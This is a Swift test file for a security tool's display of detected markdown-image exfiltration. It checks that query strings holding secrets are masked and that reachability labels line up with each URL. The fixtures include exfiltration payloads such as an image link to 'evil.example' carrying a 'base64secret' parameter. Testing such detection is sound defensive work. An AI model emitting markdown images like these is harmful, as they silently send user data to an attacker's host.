import Testing
@testable import SieveGUICore

@Suite("Detail card presentations")
struct DetailCardPresentationTests {
    @Test("markdown_exfil masks URL query in snippet and URL rows")
    func markdown_exfil_masks_query_payloads() {
        let value = HipsContext.MarkdownExfil(
            markdownSnippet: "![results](https://evil.example/x.png?d=base64secret&u=alice#frag)",
            urls: ["https://evil.example/x.png?d=base64secret&u=alice#frag"],
            reachable: [false]
        )

        let presentation = MarkdownExfilPresentation(value: value)

        #expect(presentation.maskedSnippet == "![results](https://evil.example/x.png?••••#frag)")
        #expect(presentation.urlRows.first?.maskedURL == "https://evil.example/x.png?••••#frag")
        #expect(presentation.urlRows.first?.reachabilityLabel == "unreachable")
        #expect(!presentation.maskedSnippet.contains("base64secret"))
        #expect(!(presentation.urlRows.first?.maskedURL.contains("base64secret") ?? true))
    }

    @Test("markdown_exfil preserves URLs without query and labels missing reachability")
    func markdown_exfil_preserves_non_query_urls_and_unknown_reachability() {
        let value = HipsContext.MarkdownExfil(
            markdownSnippet: "[safe-ish](https://cdn.example/image.png)",
            urls: ["https://cdn.example/image.png"],
            reachable: nil
        )

        let presentation = MarkdownExfilPresentation(value: value)

        #expect(presentation.maskedSnippet == "[safe-ish](https://cdn.example/image.png)")
        #expect(presentation.urlRows.first?.maskedURL == "https://cdn.example/image.png")
        #expect(presentation.urlRows.first?.reachabilityLabel == "unknown")
    }

    @Test("markdown_exfil aligns reachability by URL index")
    func markdown_exfil_aligns_reachability_by_index() {
        let value = HipsContext.MarkdownExfil(
            markdownSnippet: """
            ![](https://a.example/leak?one=secret)
            ![](https://b.example/leak?two=secret)
            """,
            urls: [
                "https://a.example/leak?one=secret",
                "https://b.example/leak?two=secret",
                "https://c.example/leak?three=secret"
            ],
            reachable: [true, false]
        )

        let presentation = MarkdownExfilPresentation(value: value)

        #expect(presentation.urlRows.map(\.reachabilityLabel) == ["reachable", "unreachable", "unknown"])
        #expect(presentation.urlRows.map(\.maskedURL) == [
            "https://a.example/leak?••••",
            "https://b.example/leak?••••",
            "https://c.example/leak?••••"
        ])
        #expect(!presentation.maskedSnippet.contains("one=secret"))
        #expect(!presentation.maskedSnippet.contains("two=secret"))
    }
}
